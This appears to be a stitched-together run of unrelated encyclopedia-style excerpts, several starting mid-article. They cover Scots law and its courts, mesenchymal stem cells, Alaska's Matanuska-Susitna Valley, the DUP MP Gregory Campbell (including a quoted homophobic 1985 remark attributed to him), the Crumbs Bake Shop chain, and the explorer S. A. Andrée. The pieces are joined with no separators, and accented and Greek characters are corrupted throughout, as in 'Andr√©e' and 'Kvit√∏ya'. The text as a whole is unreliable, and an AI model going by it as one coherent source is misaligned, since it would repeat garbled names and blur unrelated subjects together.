Rulings of the European Court of Human Rights and the Court of Justice of the European Union also contribute to the common law in the interpretation of the European Convention on Human Rights and European law respectively. The common law of Scotland should not be confused with the common law of England, which has different historical roots.Stair, vol. 22, para. 359 (Online) Retrieved 2011-10-26 The historical roots of the common law of Scotland are the customary laws of the different cultures which inhabited the region, which were mixed together with feudal concepts by the Scottish Kings to form a distinct common law.Barrow, p. 59Reid, I. Introduction and Property, p. 29 The influence that English-trained judges have had on the common law of Scotland through rulings of the Supreme Court of the United Kingdom (and formerly the House of Lords) has been at times considerable, especially in areas of law where conformity was required across the United Kingdom for pragmatic reasons. This has resulted in rulings with strained interpretations of the common law of Scotland, such as Smith v Bank of Scotland.Davidson, p. 253 =Academic writings= Sir James Dalrymple, Viscount of Stair A number of works by academic authors, called institutional writers, have been identified as formal sources of law in Scotland since at least the 19th century.

The Cabinet Secretary for Justice has political responsibility for policing, law enforcement, the courts of Scotland, the Scottish Prison Service, fire services, civil emergencies and civil justice. =Legislature= Many areas of Scots law are legislated for by the Scottish Parliament, in matters devolved from the Parliament of the United Kingdom. Areas of Scots law over which the Scottish Parliament has competency include health, education, criminal justice, local government, environment and civil justice amongst others. However, certain powers are reserved to Westminster including defence, international relations, fiscal and economic policy, drugs law, and broadcasting.

There is no appeal available in criminal cases to the Supreme Court of the United Kingdom, with respect to points of criminal law. Cases where the accused alleges a breach of the European Convention on Human Rights or European law can also be referred or appealed to the UK Supreme Court for a ruling on the relevant alleged breach.

These include Children's Hearings, the Lands Tribunal for Scotland, the Scottish Land Court and the Court of the Lord Lyon. The Employment Appeal Tribunal is also an example of a cross-jurisdictional tribunal. =Judiciary of Scotland= Scotland has several classes of judge who sit in the various courts of Scotland, and led by the Lord President of the Court of Session who is head of the Scottish judiciary by virtue of Section 2 of the Judiciary and Courts (Scotland) Act 2008. The second most senior judge is the Lord Justice Clerk, and together with the Senators they constitute the College of Justice. The Senators are referred to as Lords of Council and Session when sitting in civil cases, and Lords Commissioners of Justiciary when sitting in criminal cases. The sheriff courts are presided over by the Sheriffs Principal, Sheriffs, and Summary Sheriffs. They will preside over both civil and criminal cases. The most junior judges are the justices of the peace who preside over minor criminal matters in the Justice of the Peace Courts. =Legal profession= The Scottish legal profession has two main branches, advocates and solicitors.Palmer, p. 213 Advocates, the equivalent of the English barristers, belong to the Faculty of Advocates which distinguishes between junior counsel and senior counsel, the latter being designated King's or Queen's Counsel. Advocates specialise in presenting cases before courts and tribunals, with near-exclusive rights of audience, and in giving legal opinions. They usually receive instructions indirectly from clients through solicitors, though in many circumstances they can be instructed directly by members of certain professional associations. Solicitors are members of the Law Society of Scotland and deal directly with their clients in all sorts of legal affairs. In the majority of cases they present their client's case to the court, and while traditionally they did not have the right to appear before the higher courts, since 1992 they have been able to apply for extended rights, becoming known as solicitor advocates. Notaries public, unlike their continental equivalent, are not members of a separate profession; they must be solicitors, and most solicitors are also notaries. Branches of the law The principal division in Scots law is between private law (laws governing the relationship between peopleincluding legal persons) and public law (laws governing the relationship between the State and the people). Private law is further categorised into laws on Persons, Obligations, Property, Actions and Private International Law. The main subjects of public law are constitutional law, administrative law and criminal law and procedure. =Private law=Bankruptcy *Company / Partnership *Contract *Unilateral promise *Delict *Unjustified enrichment *Employment *Family *Inheritance *Property *Trusts =Public law=Administrative *Civil procedure *Constitutional *Criminal *Tax See alsoList of leading Scottish legal cases Notes ReferencesBarrow, Geofrey.

Structure  =Definition= While the terms mesenchymal stem cell (MSC) and marrow stromal cell have been used interchangeably for many years, neither term is sufficiently descriptive: * Mesenchyme is embryonic connective tissue that is derived from the mesoderm and that differentiates into hematopoietic and connective tissue, whereas MSCs do not differentiate into hematopoietic cells. * Stromal cells are connective tissue cells that form the supportive structure in which the functional cells of the tissue reside. While this is an accurate description for one function of MSCs, the term fails to convey the relatively recently discovered roles of MSCs in the repair of tissue. * The term encompasses multipotent cells derived from other non-marrow tissues, such as placenta, umbilical cord blood, adipose tissue, adult muscle, corneal stroma or the dental pulp of deciduous (baby) teeth. The cells do not have the capacity to reconstitute an entire organ. =Morphology= Human bone marrow derived Mesenchymal stem cell showing fibroblast-like morphology seen under phase contrast microscope (carl zeiss axiovert 40 CFL) at 63 x magnification An example of human mesenchymal stem cells imaged with a live cell imaging microscope Mesenchymal stem cells are characterized morphologically by a small cell body with a few cell processes that are long and thin. The cell body contains a large, round nucleus with a prominent nucleolus, which is surrounded by finely dispersed chromatin particles, giving the nucleus a clear appearance. The remainder of the cell body contains a small amount of Golgi apparatus, rough endoplasmic reticulum, mitochondria and polyribosomes. The cells, which are long and thin, are widely dispersed and the adjacent extracellular matrix is populated by a few reticular fibrils but is devoid of the other types of collagen fibrils. These distinctive morphological features of mesenchymal stem cells can be visualized label-free using live cell imaging.  Location  = Bone marrow = Bone marrow was the original source of MSCs, and still is the most frequently utilized. These bone marrow stem cells do not contribute to the formation of blood cells and so do not express the hematopoietic stem cell marker CD34. They are sometimes referred to as bone marrow stromal stem cells. = Cord cells = The youngest and most primitive MSCs may be obtained from umbilical cord tissue, namely Wharton's jelly and the umbilical cord blood. However MSCs are found in much higher concentration in the Wharton's jelly compared to cord blood, which is a rich source of hematopoietic stem cells. The umbilical cord is available after a birth. It is normally discarded and poses no risk for collection. These MSCs may prove to be a useful source of MSCs for clinical applications due to their primitive properties and fast growth rate. = Adipose tissue = Adipose tissue is another source of MSCs and these have several advantages over bone marrow-derived MSCs. Adipose tissue-derived MSCs (AdMSCs), in addition to being easier and safer to isolate than bone marrow- derived MSCs, can be obtained in larger quantities. = Molar cells = The developing tooth bud of the mandibular third molar is a rich source of MSCs. While they are described as multipotent, it is possible that they are pluripotent. They eventually form enamel, dentin, blood vessels, dental pulp and nervous tissues. These stem cells are capable of differentiating into chondrocytes, cardiomyocytes, melanocytes, and hepatocyte‚Äêlike cells in vitro. = Amniotic fluid = Stem cells are present in amniotic fluid. As many as 1 in 100 cells collected during amniocentesis are pluripotent mesenchymal stem cells.  Function  =Differentiation capacity= MSCs have a great capacity for self-renewal while maintaining their multipotency. Recent work suggests that Œ≤-catenin, via regulation of EZH2, is a central molecule in maintaining the \\"stemness\\" of MSC's. The standard test to confirm multipotency is differentiation of the cells into osteoblasts, adipocytes and chondrocytes as well as myocytes. MSCs have been seen to even differentiate into neuron- like cells, but doubt remains about whether the MSC-derived neurons are functional. The degree to which the culture will differentiate varies among individuals and how differentiation is induced, e.g., chemical vs. mechanical; and it is not clear whether this variation is due to a different amount of \\"true\\" progenitor cells in the culture or variable differentiation capacities of individuals' progenitors. The capacity of cells to proliferate and differentiate is known to decrease with the age of the donor, as well as the time in culture. Likewise, whether this is due to a decrease in the number of MSCs or a change to the existing MSCs is not known. =Immunomodulatory effects= MSCs have an effect on innate and specific immune cells. MSCs produce many immunomodulatory molecules including prostaglandin E2 (PGE2), nitric oxide, indoleamine 2,3-dioxygenase (IDO), interleukin 6 (IL-6), and other surface markers such as FasL, PD-L1 and PD-L2. MSCs have an effect on macrophages, neutrophils, NK cells, mast cells and dendritic cells in innate immunity. MSCs are able to migrate to the site of injury, where they polarize through PGE2 macrophages in M2 phenotype which is characterized by an anti- inflammatory effect. Further, PGE2 inhibits the ability of mast cells to degranulate and produce TNF-Œ±. Proliferation and cytotoxic activity of NK cells is inhibited by PGE2 and IDO. MSCs also reduce the expression of NK cell receptors - NKG2D, NKp44 and NKp30. MSCs inhibit respiratory flare and apoptosis of neutrophils by production of cytokines IL-6 and IL-8. Differentiation and expression of dendritic cell surface markers is inhibited by IL-6 and PGE2 of MSCs. The immunosuppressive effects of MSC also depend on IL-10, but it is not certain whether they produce it alone, or only stimulate other cells to produce it. MSC expresses the adhesion molecules VCAM-1 and ICAM-1, which allow T-lymphocytes to adhere to their surface. Then MSC can affect them by molecules which have a short half-life and their effect is in the immediate vicinity of the cell. These include nitric oxide, PGE2, HGF, and activation of receptor PD-1. MSCs reduce T cell proliferation between G0 and G1 cell cycle phases and decrease the expression of IFNŒ≥ of Th1 cells while increasing the expression of IL-4 of Th2 cells. MSCs also inhibit the proliferation of B-lymphocytes between G0 and G1 cell cycle phases. = Antimicrobial properties = MSCs produce several antimicrobial peptides (AMPs) including human cathelicidin LL-37, Œ≤-defensins, lipocalin 2 and hepcidin. These peptides, together with the enzyme indoleamine 2,3-dioxygenase (IDO), are responsible for the broad-spectrum antibacterial activity of MSCs. Clinical significance Typical gross appearance of a tubular cartilaginous construct engineered from amniotic mesenchymal stem cells Mesenchymal stem cells can be activated and mobilized if needed but their efficiency, in the case of muscle repair for example, is currently quite low. Further studies into the mechanisms of MSC action may provide avenues for increasing their capacity for tissue repair. = Autoimmune disease = Clinical studies investigating the efficacy of mesenchymal stem cells in treating diseases are in preliminary development, particularly for understanding autoimmune diseases, graft versus host disease, Crohn's disease, multiple sclerosis, systemic lupus erythematosus and systemic sclerosis. As of 2014, no high- quality clinical research provides evidence of efficacy, and numerous inconsistencies and problems exist in the research methods. =Other diseases= Many of the early clinical successes using intravenous transplantation came in systemic diseases such as graft versus host disease and sepsis. Direct injection or placement of cells into a site in need of repair may be the preferred method of treatment, as vascular delivery suffers from a \\"pulmonary first pass effect\\" where intravenous injected cells are sequestered in the lungs. =Detection= The International Society for Cellular Therapy (ISCT) has proposed a set of standards to define MSCs. A cell can be classified as an MSC if it shows plastic adherent properties under normal culture conditions and has a fibroblast-like morphology. In fact, some argue that MSCs and fibroblasts are functionally identical. Furthermore, MSCs can undergo osteogenic, adipogenic and chondrogenic differentiation ex vivo. The cultured MSCs also express on their surface CD73, CD90 and CD105, while lacking the expression of CD11b, CD14, CD19, CD34, CD45, CD79a and HLA-DR surface markers. Research The majority of modern culture techniques still take a colony-forming unit-fibroblasts (CFU-F) approach, where raw unpurified bone marrow or ficoll-purified bone marrow mononuclear cells are plated directly into cell culture plates or flasks. Mesenchymal stem cells, but not red blood cells or haematopoetic progenitors, are adherent to tissue culture plastic within 24 to 48 hours. However, at least one publication has identified a population of non-adherent MSCs that are not obtained by the direct-plating technique. Other flow cytometry-based methods allow the sorting of bone marrow cells for specific surface markers, such as STRO-1. STRO-1+ cells are generally more homogenous and have higher rates of adherence and higher rates of proliferation, but the exact differences between STRO-1+ cells and MSCs are not clear. Methods of immunodepletion using such techniques as MACS have also been used in the negative selection of MSCs. The supplementation of basal media with fetal bovine serum or human platelet lysate is common in MSC culture. Prior to the use of platelet lysates for MSC culture, the pathogen inactivation process is recommended to prevent pathogen transmission. New research titled Transplantation of human ESC-derived mesenchymal stem cell spheroids ameliorates spontaneous osteoarthritis in rhesus macaques  History  In 1924, Russian-born morphologist Alexander A. Maximov (); used extensive histological findings to identify a singular type of precursor cell within mesenchyme that develops into different types of blood cells. Scientists Ernest A. McCulloch and James E. Till first revealed the clonal nature of marrow cells in the 1960s. An ex vivo assay for examining the clonogenic potential of multipotent marrow cells was later reported in the 1970s by Friedenstein and colleagues. In this assay system, stromal cells were referred to as colony-forming unit-fibroblasts (CFU-f). The first clinical trials of MSCs were completed in 1995 when a group of 15 patients were injected with cultured MSCs to test the safety of the treatment. Since then, more than 200 clinical trials have been started. However, most are still in the safety stage of testing. Subsequent experimentation revealed the plasticity of marrow cells and how their fate is determined by environmental cues. Culturing marrow stromal cells in the presence of osteogenic stimuli such as ascorbic acid, inorganic phosphate and dexamethasone could promote their differentiation into osteoblasts. In contrast, the addition of transforming growth factor-beta (TGF-b) could induce chondrogenic markers.

It is known for the world record sized cabbages and other vegetables displayed annually in Palmer at the Alaska State Fair. It includes the valleys of the Matanuska, Knik, and Susitna Rivers. 11,000 of Mat-Su Valley residents commute to Anchorage for work (as of 2008). It is the fastest growing region in Alaska and includes the towns of Palmer, Wasilla, Big Lake, Houston, Willow, Sutton, and Talkeetna. The valleys are shaped by three mountain ranges: the Alaska Range, the Talkeetna Mountains and the Chugach Mountains. The Matanuska-Susitna Valley was carved by glaciers leaving thousands of lakes. The Mat-Su rivers and lakes are home to the spawning grounds of chinook, coho, sockeye, pink, and chum salmon. The area is home to 31 state parks and campgrounds. The Matanuska-Susitna Borough (the Alaskan equivalent of a county) governs the Mat-Su Valley. According to the 2010 Census, the borough's population is 88,995, a 50% increase since 2000. The area now known as Palmer was first inhabited by Athabaskan Indians. Wasilla was first inhabited by the Dena'ina Indians. The city was founded when the Alaska Railroad was constructed in 1917. Knik, the first boom-town in the valley, predates Wasilla. In 1893 the Alaska Commercial Company was built at Knik, and in 1898 Knik was settled by trappers and gold miners. Talkeetna began in the late 1890s, with the construction of a trading station and later the Alaska Railroad. Today, Talkeetna serves as the starting point for mountaineers who climb Denali. The Mat-Su Valley was explored by Russians in 1818. In 1935, as part of the New Deal 203 families from the Midwest travelled to Alaska and started the Matanuska Valley Colony. Families were specifically chosen from the states of Minnesota, Wisconsin and Michigan, due to their similarly cold winter climates. The 1939 Slattery Report on Alaskan development identified the region as one of the areas where new settlements would be established through Jewish immigration. This plan was never implemented. The region is also home to the Matanuska-Susitna College and the Mat-Su Valley Frontiersman newspaper.

A member of the Democratic Unionist Party (DUP), he has been the Member of Parliament (MP) for East Londonderry since 2001. He has referred to himself as a loyalist. Early life Campbell was born and raised in the Waterside area of Derry. He was educated at the city's technical college and at the University of Ulster. Political career He joined the DUP in the 1970s and was first elected to Londonderry City Council in 1981. Campbell briefly led the local DUP members out of the council in 1984 when it changed its name to Derry City Council, although he returned to his seat not long after. He stood down in 2011 after 30 years as a councillor. He was chosen to contest the Foyle constituency in the general election of 1983. He contested the same seat again in the general elections of 1987 and 1992, although each time he finished second behind Social Democratic and Labour Party leader John Hume. He appeared in the BBC Real Lives documentary At the Edge of the Union, which was temporarily blocked in August 1985 by direct government intervention from the then Home Secretary, Leon Brittan. This led to a one-day strike by the National Union of Journalists to defend the independence of the BBC. That same year, in an extensive interview with Magill magazine, Campbell outlined his opposition to homosexuality, telling journalist Fintan O'Toole: \\"It's an evil, wicked, abhorrent practice. My opposition to that is based on the Bible and also based on natural justice and I know many people who do not share my Protestant faith but who would share my opposition to homosexuality because they believe it is something which would corrupt society as a whole and is something so radically awful as to merit total and utter opposition. You're not even talking about something which is a run of the mill sexual practice but something which is totally and utterly depraved, and to me anyway the AIDS scare which is currently running through America is proof that homosexual practice is something which calls upon the curse of God.\\" Given that Foyle had a predominantly nationalist population, the increasingly high-profile Campbell was transferred to the more winnable East Londonderry seat, where he ran unsuccessfully in 1997. Campbell won the seat at his second attempt in the 2001 general election, gaining a majority of 1,901 over sitting MP William Ross of the Ulster Unionist Party. He was re-elected in the 2005 general election, this time securing an increased majority of 7,498 over the new UUP candidate David McClarty. Until 2016, he was also a member of the Northern Ireland Assembly, topping the East Londonderry poll (from which six members are elected) in the elections of 1998, 2003, 2007 and 2011. =Government and subsequent activity= Campbell was appointed Minister of Regional Development in the Northern Ireland Executive in July 2000. On 9 June 2008, Campbell took over the Department of Culture, Arts and Leisure, replacing Edwin Poots, following a reshuffle of the DUP's ministerial team by newly appointed First Minister Peter Robinson. He was replaced in this role by party colleague Nelson McCausland following another reshuffle on 22 June 2009 and the announcement by Peter Robinson that DUP politicians would no longer hold office in the Assembly and serve as MPs at Westminster simultaneously. In October 2008, Campbell spoke out against the American cartoon The Simpsons, after a St Patrick's day episode showed a fight between nationalists and unionists. The episode also featured references to the IRA. Campbell said, \\"The Simpsons is a humorous cartoon but the context of using a line like that about an organisation which caused so much death will lead people to have very mixed views.\\" In December 2008, Campbell criticised the singer Dido for her song \\"Let's Do the Things We Normally Do\\", which referenced lyrics from a song, \\"The Men Behind the Wire\\". The original song had been written in response to internment in Northern Ireland and Campbell suggested that Dido \\"should clarify her position so that her fans and the wider public knows where she stands on these things\\". In 2009, Campbell declared his support for capital punishment in \\"some cases\\" during a Westminster Parliament debate.House of Commons Hansard, Volume: 486, Part: 16 , publications.parliament.uk; accessed 5 June 2016. In 2011 a man was convicted and was given a suspended jail sentence and fined after posting a menacing message on Facebook about Campbell. In February 2012, Campbell voiced opposition to the redrawing of the electoral borders in Northern Ireland, stating that they \\"will have a detrimental effect on the north west.\\" Campbell supports a number of evangelical Protestant groups including a creationist lobby group, the Caleb Foundation.Liam Clarke, \\"Creationist Bible group and its web of influence at Stormont\\", Belfast Telegraph, 1 September 2012. He has been critical of some Twitter comments by Derry-born footballer James McClean and condemned McClean's decision not to wear a poppy on his shirt in the buildup to Remembrance Sunday in 2012. McClean, who played for Sunderland at the time, had stated on Twitter that his favourite song was \\"The Broad Black Brimmer\\" by the republican folk group The Wolfe Tones.\\"James McClean responds to anger over IRA song\\" , newsletter.co.uk; accessed 6 May 2016. Campbell commented, \\"I've been watching him closely and knew he would slip up sooner or later.\\" Subsequently, McClean was banned from using Twitter from his club. Campbell was offered an invitation to a Wolfe Tones concert, which he declined.\\"Wolfe Tones invite James McClean row DUP man Gregory Campbell for concert\\" , Belfast Telegraph; accessed 8 May 2016. In March 2013, Campbell made a successful parliamentary motion to stop a one-off concept car made by the motor company Kia from ever going into production. The show car was unveiled at the Geneva Motor Show and was named \\"Provo\\" after the Italian word Prova, meaning trial or test. He put forward a motion at the House of Commons to stop any possible development of the car, due to the connotations the name might have in Ireland (\\"Provos\\" is a common shortened form of Provisional IRA), although the car was never intended to go into production. A spokesperson for Kia said in a statement it would be certain not to market any future car as a \\"Provo\\" in the United Kingdom or the Republic of Ireland, adding \\"This car is a showcase, it's a little bit of frivolity, it's for a motor show in Switzerland designed by an Italian at a design studio in Frankfurt.\\" In November 2014, Campbell became embroiled in a controversy after parodying the Irish language while addressing the Northern Ireland Assembly. Mocking the nationalist MLAs' tradition of beginning addressing the Assembly with the Irish words \\"go raibh maith agat, Ceann Comhairle\\" (\\"thank you, Speaker\\"), he opened a question about minority language policy saying \\"curry my yoghurt, can coca coalyer\\", an anglicised corruption of the Irish. Campbell was unwilling to apologise, and was temporarily censured. He said at the DUP's annual conference later that month: \\"On behalf of our party let me say clearly, and slowly so that Caitr√≠ona Ruane and Gerry Adams understand, we will never agree to an Irish Language Act at Stormont and we will treat their entire wish list as no more than toilet paper.\\" In March 2019, Campbell was one of 21 MPs who voted against LGBT inclusive sex and relationship education in English schools. Personal life Campbell is a supporter of Scottish football club Rangers.

Founded in 2003 as a small mom-and-pop style bakery on the Upper West Side of Manhattan by Mia & Jason Bauer, the company expanded to 79 locations in nine states (New York, Illinois, Virginia, Connecticut, New Hampshire, Massachusetts, New Jersey, Rhode Island, and California) and Washington, D.C.. Crumbs was the largest cupcake chain in the United States. It produced more than 50 varieties of gourmet cupcakes. Crumbs reopened on October 14, 2014 at its Broadway location in New York and other locations after a three-month shutdown, but then closed all of its reopened stores permanently in December 2016. Partnerships On August 6, 2012, the company announced a partnership with Starbucks to serve their brand of coffees, teas, and other assorted beverages. The partnership ended in September 2013 due to a sharp decrease in sales and customer satisfaction. On May 15, 2013, the company announced it had partnered with chef and restaurateur David Burke to begin marketing a new line of gourmet sandwiches and salads to be sold at select Crumbs locations. This partnership ended roughly a month later due to poor sales. On September 13, 2013, the company announced the planned opening of their first ever gluten-free store in lower Manhattan. Crumbs Gluten Free featured the same cupcakes, cookies, brownies and pastries that the brand is known for in gluten-free versions. On February 4, 2014, the company announced a partnership with Pelican Bay Ltd. to create a line of At-Home kits, including Crumbs Cupcake mixes, hot chocolate kits, cupcake-in-a-mug kits and \\"Colossal\\" cupcake kits. The line was sold at club and craft stores across the country. The company shut the doors for customers on December 19, 2016. Financial status Crumbs Bake Shop, a publicly traded business listed on NASDAQ, reached its peak stock price in 2011. A one-time loss of US $700,000 due to Hurricane Sandy in combination with steadily declining sales due to competition from locally owned mom-and-pop cupcake shops as well as increased competition from grocery stores, caused a sharp decline in the company's prospects and stock price in 2013. Crumbs borrowed $10 million through convertible promissory notes and announced plans to close some underperforming stores in 2013. On July 8, 2014, the company announced it was immediately closing all of the remaining locations and evaluated its options, including a possible bankruptcy filing.Cupcake purveyor Crumbs Bake Shop closes L.A., other stores. Los Angeles Times. Retrieved July 8, 2014. Crumbs, which went public three years ago at the height of the gourmet-cupcake boom, has seen its financial outlook deteriorate amid several years of losses, a dwindling cash supply, and a food craze that is petering out. The company‚Äôs stock was delisted from the NASDAQ Stock Market on July 1, a development that the company warned would trigger a default on some debt payments. Shortly after Crumbs closed its shops, an announcement was made that a deal had been reached to transfer the rights to the chain to an investment group including Marcus Lemonis (of the CNBC reality show The Profit) and Fischer Enterprises. The group stated that their intentions were to rapidly reopen stores with more diverse offerings. As part of the agreement the existing corporation filed for bankruptcy, and court approval was needed to finalize the deal. On August 26, 2014, Crumbs won court approval to start reopening its stores, intending to keep only about 24 stores open. On October 14, 2014, Crumbs reopened its first shop in Manhattan. Marcus Lemonis sold his interest in the Crumbs retail stores in September 2015, as the baked-goods venture wasn't performing to expectations.http://www.chicagobusiness.com/article/20150901/BLOGS09/150909994/marcus- lemonis-sells-stake-in-crumbs In April 2016 the value of Crumbs stock had fallen to less than $.01 per share. In December 2016, Crumbs Bake Shop once again closed all its stores, this time permanently.

Photographed by Nils Strindberg, the exposed plate was among those recovered in 1930. The grand homecoming of the bodies from the polar expedition to Stockholm, October 5, 1930 Salomon August Andr√©e (18 October 1854, Gr√§nna, Sm√•land ‚Äì October 1897, Kvit√∏ya, Arctic Norway), during his lifetime most often known as S. A. Andr√©e, was a Swedish engineer, physicist, aeronaut and polar explorer who died while leading an attempt to reach the Geographic North Pole by hydrogen balloon. The balloon expedition was unsuccessful in reaching the Pole and resulted in the deaths of all three of its participants. Early life and influences Andr√©e was born in the small town of Gr√§nna, Sweden; he was very close to his mother, especially after the death of his father in 1870. He attended the Royal Institute of Technology in Stockholm and graduated with a degree in mechanical engineering in 1874. In 1876 he went to the Centennial Exposition in Philadelphia, where he was employed as a janitor at the Swedish Pavilion. During his trip to the United States he read a book on trade winds and met the American balloonist John Wise; these encounters initiated his lifelong fascination with balloon travel.Wilkinson, Alec. \\"The Ice Balloon\\", The New Yorker. April 19, 2010. p39. He returned to Sweden and opened a machine shop where he worked until 1880; it was less than successful and he soon looked for other employment. From 1880 to 1882 he was an assistant at the Royal Institute of Technology, and in 1882-1883 he participated in a Swedish scientific expedition to Spitsbergen led by Nils Ekholm, where Andr√©e was responsible for the observations regarding air electricity. From 1885 to his death, he was employed by the Swedish patent office. From 1891 to 1894 he was also a liberal member of the Stockholm city council. As a scientist, Andr√©e published scientific journals about air electricity, conduction of heat, and inventions. A keen friend of Jonas Patrik Ljungstr√∂m, he notably educated the former's sons Birger, and Fredrik Ljungstr√∂m.Fredrik Ljungstr√∂m 1875-1964 - Uppfinnare och inspirat√∂r (1999), Olof Ljungstr√∂m His view of life was that of the natural sciences, and he entirely lacked interest in art or literature. He was a believer in industrial and technical development, and claimed also that emancipation of women would come as a consequence of technical progress. Expedition to the North Pole Supported by the Royal Swedish Academy of Sciences and funded by people like King Oscar II and Alfred Nobel, his polar exploration project was the subject of enormous interest and was seen as a brave and patriotic scheme. The North Pole expedition made a first attempt to launch the balloon √ñrnen (The Eagle) in the summer of 1896 from Danes Island, an island in the west of the Svalbard Archipelago, but the winds did not permit the expedition to start. When Andr√©e next tried, on 11 July 1897, together with his companions engineer Knut Fr√¶nkel and photographer Nils Strindberg (a second cousin of playwright August Strindberg), the balloon did set off and sailed for 65 hours. This was not directed flight, however; already at the lift-off the gondola had lost two of the three sliding ropes that were supposed to drag on the ice and thus function as a kind of rudder (this was observed by the ground crew). And within ten hours of lift-off, they were caught by powerful winds from a storm raging in the area. The heavy winds continued and, together with the rain creating ice on the balloon, impeded the flight. It is likely that Andr√©e realized before the flight ended that they would never come near the pole. For these reasons, they were forced down onto the ice, though the landing was conducted in a semi-controlled way rather than actually crashing. They had covered 295 miles (475 km) and floundered on the pack ice. The expedition was well equipped for travelling on the ice (three sledges and a boat) and had supplies for three months; also there were three deposits in northern Svalbard and one in Franz Josef Land. They set off eastbound for the latter, but after a week they had moved west due to the currents which moved the ice. They then changed direction towards northern Svalbard; movement was slowed down by ice drift and by the craggy surface of the pack ice. The three had to pull the sledges themselves, and despite good reserves of food, added to by their shooting polar bears, the efforts against the moving, uneven ice wore them out. They reached land in early October after over two months on the ice, setting foot on Kvit√∏ya (White Island), just east of Svalbard. They perished there, probably within two weeks after landfall. Most modern writers agree that Nils Strindberg died within a week of arrival: he was buried among the rocks (though no marker was placed on his grave) while the other two men were later found in the tent. Diary notes and observations end just a few days after they landed on Kvit√∏ya; up to that point these had been kept up even in hard conditions; this seems to indicate that something critical happened after a few days. It is likely that Strindberg met his end at this point. It has not been possible to establish the reason for his death. Suicide (which would have been possible with opium) is very unlikely in his case even though by this time all three no doubt realized they would die. Whatever Strindberg might have felt about the outcome of the expedition, it is near certain that he would have judged the option of suicide as treachery to his fellow explorers.Per-Johan √ñstberg, Tolkning, f√∂rst√•else, vetande (Interpretation; understanding, knowledge), Stockholm 1979, p.116 - the book makes a long and rigorous analysis of the written and physical traces of the Andr√©e expedition and how these may be harnessed in rational interpretation of the course of the journey. The diary notes of the expedition indicate that all three men were sometimes plagued by digestive trouble, illness and exhaustion during the trek over the sea ice. The ultimate cause of death probably had something to do with the ingestion of polar bear flesh carrying Trichinella parasites, which were found in the remains of a polar bear on the spot examined by the Danish physician Ernst Tryde and published in a book in 1952 called \\"The Dead on White Island\\". There is no doubt that the men became infected at some point during the ice trek, though the exact time span is unclear (and this matters because humans normally develop immunity to trichinosis if they survive the first wave of infection). When they arrived at White Island they were suffering from recurrent diarrhea. A plausible indication of this is that some of the provisions they brought ashore (obviously after a few days of scouting to the west) were unloaded and left near the water and not carried to a safer place near the camp. In contrast, Arctic explorer Vilhjalmur Stefansson theorized in his book 'Unsolved Mysteries of the Arctic' that Nils Strindberg probably had died while chasing a polar bear, perhaps from drowning, and Andr√©e and Fr√¶nkel had asphyxiated on carbon monoxide from a malfunctioning stove while cooking in their tent. To account for the unburned amount of fuel in the stove Stefansson referred to his own experience with malfunctioning stoves that required regular pumping up to keep burning. In his opinion they had not lost hope of getting back, but they had made many mistakes and would have died of something else if they hadn't died when they did. Aftermath Until Andr√©e's last camp was found in 1930, what could have happened to the expedition was the subject of myth and rumours. In 1898, eleven months after Andr√©e's first sighting of White Island (which he called New Iceland) a Swedish polar expedition led by A. G. Nathorst was passing by just 1 km offshore from the camp, but the weather stopped them from getting ashore. Already around this time, it was noticed that a heavy storm had been raging and that the expedition had lost the steering lines at departure, and experienced polar explorers surmised already before 1930 that the expedition couldn't have got very far and had likely been forced down on the ice. Finally the remains of the three men were found in 1930 by the Norwegian Bratvaag Expedition which picked up remains including two bodies. A month later the ship M/K Isbj√∏rn, hired by a newspaper, made additional finds, among them the third body. Notebooks, diaries, photographic negatives, the boat and many utensils and other objects were recovered. The homecoming of the bodies of Andr√©e and his colleagues Strindberg and Fr√¶nkel was a grand event. King Gustaf V delivered an oration, and the explorers received a funeral with great honors. The three explorers were cremated and their ashes interred together at the cemetery Norra begravningsplatsen in Stockholm. Modern assessments Starting in the 1960s, Andr√©e's status as a national hero has become questioned and a cooler, more skeptic view began to prevail, in a way not unlike the changing assessment of Robert Falcon Scott's South polar journey. The emphasis has turned to the fact that the expedition was bound to fail, and that Andr√©e obviously refused to take in information that questioned the expedition's feasibility (and also had meagre actual flight experience with large balloons, and none in Arctic conditions). Andr√©e has been seen as a manipulator of the national emotions of his age, bringing a meaningless death on himself and his two companions.This assessment is discussed in several contexts in V√•r position √§r ej synnerligen god... by Andr√©e specialist Sven Lundstr√∂m, curator of the Andreexpedition Polarcenter in Gr√§nna, Sweden (see for example p. 131) and it's also a key underpinning of P-O. Sundman's two books, Ingenj√∂r Andr√©es luftf√§rd and Ingen fruktan, intet hopp Several modern writers, following Per Olof Sundman's Andr√©e portrait in the semidocumentary novel Flight of the Eagle (\\"Ingenj√∂r Andr√©es luftf√§rd\\", 1967), have speculated that Andr√©e, by the time of the departure for Svalbard in 1897, had become the prisoner of his own successful funding campaign and the excited national feelings, and was now incapable of backing out or admitting weaknesses in the plans in front of the press.See Kjellstr√∂m, p. 45, and Lundstr√∂m, pp. 69-73. Legacy Andr√©e Land in Greenland was named after him by Swedish Arctic explorer A.G. Nathorst. The Italian poet Giovanni Pascoli wrote a poem about Andr√©e's expedition and death. Andr√©e's writings were adapted into the song cycle The Andr√©e Expedition by the American composer Dominick Argento, written for the Swedish baritone H√•kan Hageg√•rd. Swedish composer Klas Torstensson's opera \\"Expeditionen\\" (1994‚Äì99) is also based on Andr√©e's story. Historian Edward Guimont has proposed that the 1930 discovery of the expedition's remains influenced H. P. Lovecraft in the writing of At the Mountains of Madness.Edward Guimont, \\"An Arctic Mystery: The Lovecraftian North Pole\\", in Lovecraft Annual 14, ed. S. T. Joshi (New York: Hippocampus Press, 2020), 148-51. In 1982, the Swedish filmmaker Jan Troell directed a film based on Sundman's book, Flight of the Eagle. In 2010, the American rock group Brian's Escape created a seven-track concept album inspired by Andr√©e's adventures entitled The Journey: An Account of S. A. Andr√©e's Arctic Expedition of 1897. The 2010 novel Strindberg's Star by Swedish writer Jan Wallentin revolves around the story of the expedition. The explorers reportedly found two relics which opened a portal to the Norse underworld and set off a chain of events connecting both world wars and the modern day with ancient Norse myths. In 2012, English band The Greenland Choir included a song Reindeer, 1897 on their E.P. Here we are, wandering around like ghosts, which was inspired by Andr√©e. In 2013, UK/ Norway theatre company New International Encounter (NIE) created a show charting the story of the ice balloon in co-production with The North Wall Oxford and The Key Theatre. North North North premiered at The Key Theatre, Peterborough on May 9, 2013 and toured across the UK and internationally. A 2013 novel Expeditionen : min k√§rlekshistoria by Swedish writer Bea Uusma retells the story from the point of view of Strindberg's love for his fianc√©e, Anna Charlier.

